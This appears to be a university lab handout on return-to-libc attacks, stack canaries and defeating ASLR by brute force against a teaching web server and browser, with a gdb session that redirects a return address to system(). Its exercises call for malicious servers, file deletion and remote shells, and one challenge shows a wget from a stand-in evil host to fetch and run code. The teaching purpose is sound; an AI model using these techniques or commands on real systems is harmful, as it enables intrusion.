      <h1>Lab 2: Return-to-libc</h1>
      <hr>

<h3>Lab Overview</h3>
In this lab, you'll explore how to defeat the protection
mechanisms introduced to counter buffer overflows. The first
type of countermeasure is non-executable stack, which will
mark the stack memory segment, along with other segments,
non-executable. Thus, even the shellcode jumps back to
the stack, it has no chance to execute. To defeat this
protection mechanism, you
will study and use a specific technique called <i>return-to-libc</i>, a
special and easy form of return-oriented programming. By using
return-to-libc, shellcode can jump to any library code (or any
executable code). 

<p>
The second type of countermeasure is memory address layout
randomization (ASLR). The key idea of ASLR is to set random
addresses for specific memory segments of a given process. Thus, it
will be very difficult for an adversary to know the exact
address of a buffer. To defeat this protection mechanism, the
adversay can guess the starting address of a buffer and
attack the server brute-forcely. This is rather realistic, because
the range of the stack is relatively small.

<p>
The third type of countermeasure is a <i>canary</i>. In its simplest
form, a
canary is an integer on the stack (after the buffer), by checking
whether or not a canary is altered, one can check whether or not
the buffer is over flowed, just <i>before</i> the function
returns. To defeat this, an adversary can just guess the
value of the canary. At a first glance, this will be very
hard, if not impossible, because the value space is dramatically
huge: 2<sup>32</sup>. However, you will understand that under
some circumstance, say a web server like Touchstone, it will be
very practical. An adversary only need to guess just 1024 times
to succeed.

<p>
This lab consists of three parts:
<ul>
  <li>Part A: you will implement a simple form of <i>Phishing</i>. By
    planting the shellcode into to the web server, the hacker
    can attack victims using a buggy browser;
  </li>
  <li>Part B: you will defeat the <i>Non-executable stack</i> 
    protection, by using return-to-lic attack; and
  </li>  
  <li>Part C: you will defeat the Touchstone web server in a
    realistic environment: the <code>ASLR</code> is enabled.
  </li> 
</ul>

<h3>Lab Environment</h3>
Download <a href="lab2-code.rar">this code</a>
 to start with. In the first two parts of this lab, you will first
disable ASLR:
<pre>
      $<kbd> su root</kbd>
        Password: (enter root password)
      # <kbd>sysctl -w kernel.randomize_va_space=0</kbd>
</pre>
In the third part of this lab, you'll turn on ASLR.

<h1>Part A: Phishing</h1>
Generally, <a href="https://en.wikipedia.org/wiki/Phishing">Phishing</a>
attempts to acquire sensitive information such as username, 
password, and credit card details (and sometimes, indirectly, money)
by masquerading as a trustworthy entity in an electronic
communication. In this lab, you'll design and implement a
simple form of Phishing. Tobe specific, you (acting as
the malicious attacker) will construct
a web server which produces malicious HTTP responses. Thus, when
a vitim visits your web server, the victim's browser will be
attacked: the browser will be crashed, or the victim's computer
will even be taken over.

<div class="required">
<p><span class="header">Exercise 1.</span>
First, read the browser's source code, find out at least one 
buffer overflow vulnerability. Describe briefly how this
vulnerability can be exploited. 
<p>
Now read the web server's source code, locate the key code
snippet which sends response to the browser, how can you change
the code to crash the browser with the above vulneralibity? Implement
your idea. Don't forget to test your code to make sure
the malicious web server works as expected.
</div>

<p>
Just like overflowing the web server, one can do much more
serious attacks during phishing: say, popping up a remote
shell, unlinking a file, stealing sensitive files, etc..

<div class="required">
<p><span class="header">Exercise 2.</span>
Use the techniques studied in the lab 1 to attack the
browser. The basic requirement is to unlink (delete)
some file on the machine running the browser. Further, you
can pop up a remote shell or open a socket, etc..
</div>

<div class="challenge">
<p>
<span class="header">Challenge!</span>
The browser you've been using so far is very simple: basically, it
can only read reponse from the web server (as a sequence of
characters). A real-world browser tends to be more complex: besides
reads response, it also renders html, run JavaScript engine, perfrom
various security checking, etc.. So this means that a real-world
browser tends to contain more vulnerabilities. So you can investigate
how to attack real-world browsers using the knowledge you've
learned. You can browse through the known vulnerabilities 
on <a href="http://cve.mitre.org/" target="_blank">CVE</a>, and
you can use some tools like
<a href="http://www.metasploit.com/" target="_blank">
metasploit</a> to make the work of creating shellcode simpler.
</div>


<h1>Part B: Non-executable Stack and Return-to-libc Attack</h1>
To counter buffer overflows, many modern operating systems
introduce non-executable stack by marking the stack memory
segments non-executable. On old OS, this is achieved by setting
up the CS segment register; and modern architecture introduce
the NX bit in the page table to help OS manage execution
permission. In this part of the lab, you will explore how
this protection mechanism can be circumvented.

<div class="required">
<p><span class="header">Exercise 3.</span>
The Ubuntu 12.04 OS you've been using in this lab has
the non-executable stack support
by default. To compile a C program, just use the
<code> -z noexecstack</code> 
option to mark the stack segment non-executable.  
Re-compile the vulnerable program <code>stack2.c</code> 
from lab 1:
<pre>
  $ <kbd>gcc -z noexecstack stack2.c</kbd>
</pre>
perform a buffer-overflow attack, can you succeed
any more? What do you observe?
</div>

<p>
The key observation to exploiting buffer overflows with a 
non-executable stack is that even though you cannot jump to the address 
of the overflowed buffer (it will not be executable), there's 
usually enough code already in the vulnerable program's address space 
to perform the operation you want.

<p>
Thus, to defeat a non-executable stack, you need to first find 
the (binary) code you want to execute. The most straightforward way
is often to find out a function in the 
standard library, say libc. There are many useful functions
in these library, such as <code>execl</code>, 
<code>system</code>, or <code>unlink</code>, etc..
Then, you need to arrange for the stack to look like a call to 
that function with the desired arguments, such as <code>
system("/bin/sh")</code>. Finally, you need to arrange for the 
RET instruction to jump to the function you found in the first 
step. This attack is often called a <a href="https://en.wikipedia.
org/wiki/Return-to-libc_attack">return-to-libc attack</a>.

<h3>Understand the Stack</h3>
To know how to conduct the return-to-libc attack, it is essential to 
understand how the stack works. We use a small C program to understand
the effects of a function invocation on the stack.<p>

<pre class="tty">
/* foobar.c */
#include &lt;stdio.h&gt;
void foo(int x)
{
  printf("Hello world: %d\n", x);
}

int main()
{
  foo(1);
  return 0;
}

We can use "gcc -S foobar.c" to compile this program to the assembly code. The 
resulting file foobar.s will look like the following:

    ......
  8 foo:
  9         pushl   %ebp
 10         movl    %esp, %ebp
 11         subl    $8, %esp
 12         movl    8(%ebp), %eax
 13         movl    %eax, 4(%esp)
 14         movl    $.LC0, (%esp)  : string "Hello world: %d\n"
 15         call    printf
 16         leave
 17         ret
    ......
 21 main:
 22         leal    4(%esp), %ecx
 23         andl    $-16, %esp
 24         pushl   -4(%ecx)
 25         pushl   %ebp
 26         movl    %esp, %ebp
 27         pushl   %ecx
 28         subl    $4, %esp
 29         movl    $1, (%esp)
 30         call    foo
 31         movl    $0, %eax
 32         addl    $4, %esp
 33         popl    %ecx
 34         popl    %ebp
 35         leal    -4(%ecx), %esp
 36         ret
</pre>

<h5>Calling and Entering foo() </h5>
Let us concentrate on the stack while calling foo(). We can ignore 
the stack before that. Please note that line numbers instead of 
instruction addresses are used in this explanation.
<p>
<div style="text-align:center">
  <img src="./enter_leave_foo.jpg">
</div>
<p>

Line 28-29:
These two statements push the value 1, i.e. the argument to the 
<code> foo() </code>, into the stack. This operation increments 
<code>%esp</code> by four. The stack after these two statements 
is depicted in figure(a).<p> 

Line 30:
<code> call foo </code> The statement pushes the address 
of the next instruction that immediately follows the <code>call</code> 
statement into the stack (i.e the return address), and then jumps
to the code of <code>foo()</code>. The current stack is depicted in 
figure (b).<p>

Line 9-10:
The first line of the function <code>foo()</code> pushes <code>%ebp
</code> into the stack, to save the previous frame pointer. The second
line lets <code>%ebp</code> point to the current frame. The current 
stack is depicted in figure (c).<p>

Line 11: 
<code>subl $8, %esp</code> The stack pointer is modified to 
allocate space (8 bytes) for local variables and the two 
arguments passed to <code>printf</code>. Since there is no 
local variable in function <code>foo</code>, the 8 bytes are 
for arguments only. See figure (d)<p>

<h5>Leaving foo()</h5>
 
Now the control has passed to the function <code>foo()</code>. 
Let us see what happens to the stack when the function returns.

<p>

Line 16: 
<code>leave</code> This instruction implicitly performs two 
instructions (it was a macro in earlier x86 releases, but was 
made into an instruction later):
<PRE CLASS="verbatim">    
  mov  %ebp, %esp
  pop  %ebp
</PRE>

The first statement release the stack space allocated for the function;
the second statement recover the previous frame pointer.
The current stack is depicted in Figure(e).

<p>

Line 17: 
<code>ret</code> This instruction simply pops the return
address out of the stack, and then jump to the return address.
The current stack is depicted in Figure(f).
<p>

Line 32: 
<code>addl $4, %esp</code>Further resotre the stack by
releasing more memories allocated for <code>foo</code>.
As you can clearly see that the stack is now in exactly the 
same state as it was before entering the function 
<code>foo</code> (i.e., before line 28).

<p>

<h3> Smashing the Stack</h3>
Read the virtual file <code>/proc/pid/maps</code> on your
machine (<code>pid</code> is the process id) you can find
and locate the key library such as 
<code>libc-2.15.so</code>, which contains many useful functions. The 
key function you may use to attack the target may be <code>system(),
unlink()</code> and so on.

<div class="required">
<p><span class="header">Exercise 4.</span>
Use gdb to smash the function stack, the C program offered you here
is <code>exec3.c</code>. Note that, the function address at your PC may 
be different from  mine, but just take it easy.  
<pre>
  $<kbd> gcc exec3.c -o exec3 -fno-stack-protector -z noexecstack -g </kbd>

  $<kbd> gdb -q exec3</kbd>
    Reading symbols from exec3...done.
  (gdb) <kbd>b fun</kbd> 
    Breakpoint 1 at 0x8048423: file exec3.c, line 6.
  (gdb) <kbd>r</kbd>
    Starting program: /home/seed/sand-box/exec3 

    Breakpoint 1, fun () at exec3.c:6
    	     printf("Return to fun!\n");
  (gdb)<kbd> p system</kbd>
    $1 = {<text variable, no debug info>} 0xb7e583b0 <__libc_system>
  (gdb)<kbd> p/x $ebp+4</kbd>
    $2 = 0xbffff3cc
  (gdb)<kbd> set *0xbffff3cc=0xb7e583b0</kbd>
  (gdb)<kbd> p/x $ebp+16</kbd>
    $3 = 0xbffff3d8
  (gdb)<kbd> set *0xbffff3d8=0x736c</kbd>
  (gdb)<kbd> x/s 0xbffff3d8</kbd>
    0xbffff3d8:	"ls"
  (gdb)<kbd> p/x $ebp+12</kbd>
    $4 = 0xbffff3d4
  (gdb)<kbd> set *0xbffff3d4=0xbffff3d8</kbd>
  (gdb)<kbd> c</kbd>
    Continuing.
  Return to fun!
  exec3  exec3.c nop-overflow.c	stack1.c  stack.c  test.c  x

  Program received signal SIGSEGV, Segmentation fault.
  0xbffff3d8 in ?? () 
</pre>

As you can see, the command <code>system("ls")</code>
constructed by gdb
runs smoothly, but not perfect. What triggered the "SIGSEG"
fault? Modify the process memory in gdb just likeabove, to
to let the process exit gracefully. 
</div>

<h3>Ret-to-libc Attack</h3>
Till now, you already know how the function call stack
is organized and how to find the library function address. So
you can try to attack the Touchstone web server using
ret-to-libc. 

<div class="required">
<p><span class="header">Exercise 5.</span> 
First, compile the Touchstone webserver:
<pre>
  $ <kbd>make</kbd>
  $ <kbd>./touchstone</kbd>
</pre>
Now, try to perform a return-to-libc attack by contructing and
sending a malicious request containing your shellcode. Your
shellcode can still delete a file from the web server, or can
do something else.
</div>

<div class="challenge">
<p><span class="header">Challenge!</span>
The <code>system()</code> function allow one to run
shell script, so it's very intereting to think how
an adversary can use this function to do something useful. For
instance, the adversary can download a C file to the webserver from
some site by 
<code>wget http://i.am.evil/bad.c</code>, and then compile
this C program and run it at the 
webserver side. In this sense, your shellcode's functionality will
not be constrained by its size any more.
</div>

<h1>Part C: Address Space Layout Randomization</h1>
Address space layout randomization is a technique used to
fortify systems against buffer overflow attacks. The idea
is to introduce artificial diversity by randomizing the
memory location of certain system 
components. This mechanism is available for both Linux (via PaX 
<a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" 
target="_blank">ASLR</a>) and OpenBSD.

<h3>ASLR</h3>
Randomizing the memory-address-space layout of software has recently 
garnered great interest as a means of diversifying the monoculture 
of software. It is widely believed that randomizing the address-space 
layout of a software program prevents attackers from using the
same exploit code effectively against all instantiations of the
program containing the same flaw. However, as you'll do in this
part, it's not hard to defeat ASLR, at least on 32-bit systems. 

<p>
Now, turn on the Ubuntu's address space layout randomization:
<pre>
       $<kbd> su root</kbd>
         Password: (enter root password)
       #<kbd> /sbin/sysctl -w kernel.randomize_va_space=2</kbd>
</pre>
<div class="required">
<p><span class="header">Exercise 6.</span>
After turning on the ASLR, compile the Touchstone web server:
<pre>
  $ <kbd>make all</kbd>
  $ <kbd>./touchstone</kbd>
</pre>
try to attack the webserver using buffer overflow. Can
you succeed? Where is the buffer's address? Is it
exploitable?
</div>

<h3>Brute-force Attack</h3>
To defeat ASLR, we can use the <i>Brute 
Force</i> attack technique, which is simple but effective 
in guessing the variable buffer address. The basic idea
is that although we don't know the exact address of
the buffer, however, we know its range, say, from
<code>0x00000000</code> to <code>0xbfffffff</code>. So, by
trying each address in turn, we'll hit the right address
sooner or later.

<div class="required">
<p><span class="header">Exercise 7.</span>
After turning on the ASLR, compile the Touchstone web server:
<pre>
  $ <kbd>make all</kbd>
  $ <kbd>./touchstone</kbd>
</pre>
Send a request to the server containing the guessed address, repeating
this process until you succeed. (Hint: think carefully the
possible address of the buffer (hence the stack). Is every
address between <code>0x00000000</code> to <code>0xbfffffff</code>
possible? Is every address in the given stack a candidate for
the buffer address? Answering these questions as precisely
as possible will speed up your brute-force attack dramatically.)
</div>
 
<div class="challenge">
<p>
<span class="header">Challenge!</span>
Turn on ASLR, enable non-executable stack, enable stack canary, and
perform buffer overflow attack on the Touchstone web server. Do you have
any chance to secceed? If yes, how? (We have succeeded!)
</div>
